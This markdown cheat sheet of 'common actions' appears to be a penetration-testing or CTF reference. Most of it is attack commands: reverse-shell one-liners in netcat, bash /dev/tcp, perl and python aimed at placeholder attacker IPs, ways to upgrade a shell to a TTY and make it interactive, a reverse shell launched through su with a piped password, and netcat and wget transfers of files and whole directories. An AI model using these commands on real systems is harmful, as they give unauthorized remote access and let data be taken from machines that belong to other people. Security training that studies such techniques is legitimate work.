# common actions

**table of contents**:

- [shells](#shells)
  * [reverse shells](#reverse-shells)
    + [netcat](#netcat)
    + [bash](#bash)
    + [perl](#perl)
    + [python](#python)
    + [php](#php)
    + [msfvenom](#msfvenom)
  * [spawning tty shells](#spawning-shells)
    + [python](#python)
    + [bash/sh](#bash/sh)
    + [perl](#perl)
    + [text editors](#within-text-editors)
      - [vi](#vi)
    + [nmap](#nmap)
    + [script](#script)
  * [making fully-interactive shells](#making-them-fully-interactive)
    + [working around spawning issues](#spawn-workarounds)
- [file transfers](#file-transfers)
  * [wget](#wget)
  * [netcat](#netcat)
    + [files](#SENDING-FILES-BETWEEN-SYSTEMS)
    + [directories](#SENDING-WHOLE-DIRECTORIES)

---

# shells

## reverse shells

### netcat

<small>sending:</small>
```
nc -e /bin/sh [LOCAL IP] [PORT]
```

<small>catching:</small>
```
nc -lvp [PORT]
```

### bash

```
bash -i >& /dev/tcp/[LOCAL IP]/[PORT] 0>&1
```

### perl

```
perl -e 'use Socket;$i="[LOCAL IP]";$p=[PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[LOCAL IP]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### php

### msfvenom

----
## spawning shells

#### **python**

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

#### **bash/sh**
```
/bin/sh -i
```
```
echo os.system('/bin/bash')
```

#### **perl**
```
perl -e 'exec "/bin/sh";'
```

#### **within text editors**:

##### _vi_:
```
:!bash
```
```
:set shell=/bin/bash:shell
```

#### **nmap**:
```
!sh
```

#### **script**

```
## this method can potentially avoid needing to do all the stty/fg/bg work below
/usr/bin/script -qc /bin/bash /dev/null
```

----
## making them fully interactive

when getting a reverse shell through `netcat`, by default it's non-interactive - meaning it's a pain. once you run any of the above scripts to get a partially interactive shell, you can do a few more things to optimize:

_non-interactive shell_:
```
## get partially interactive shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

_remote shell_:
```
## background process netcat in the remote shell
user@remote:$ ^Z
```
_local env_:
```
## get rows/cols values from your current env
user@local:~$ stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'

## so you can pass keyboard shortcuts, bring netcat back to the foreground 
user@local:~$ stty raw -echo; fg
```
<small>**[ZSH NOTE]**: zsh, specifically, only respects the -echo until the next prompt which means that you need to type your next command all in one line</small>

_remote env_:
```
## set the correct sizes for the remote shell
user@remote:~$ stty rows [ROWS] cols [COLS]

## export shell to ENV
export SHELL=/bin/bash

## enable colors
user@remote:~$ export TERM=xterm-256color

## reload shell to apply the TERM variable
user@remote:~$ reset 
OR
user@remote:~$ exec /bin/bash
```

#### spawn workarounds

_for non-responsive shell spawning when you need to change users_

first start a listening on your local host machine:

```
nc -nlvp [PORT]
```

then, from the remote/target machine:

```
echo "[PASSWORD]" | su - [USER] -c "bas -i >& /dev/tcp/[LOCAL IP]/[PORT] 0>&1"
```

---

## file transfers

### wget

**usecase**: fetch files/scripts from your local machine on the remote host

_sender_:
```
cd souce_directory
python -m http.server 
```

_'receiver' (more accurately, a fetcher here)_:
```
## python http server always starts by default at port 8000
## unless otherwise specified
wget http://[LOCAL IP]:8000/[FILE YOU WANT]
```

### netcat

##### SENDING FILES BETWEEN SYSTEMS

_receiver_:

start a listener and provide the name you want to give the sent file

```
nc -l -p [PORT] > [FILENAME]
```

_sender_:
```
nc -w 3 [RECEIVER IP] [PORT] < [FILENAME]
```

##### SENDING WHOLE DIRECTORIES

_receiver_:

maybe first create a separate directory if you want one, since this is going to send multiple files, then `cd` into it and start a `netcat` listener

```
nc -l -p [PORT] | tar xf -
```

_sender_:

```
cd source_directory
tar cf - . | nc [RECEIVER IP] [PORT]
```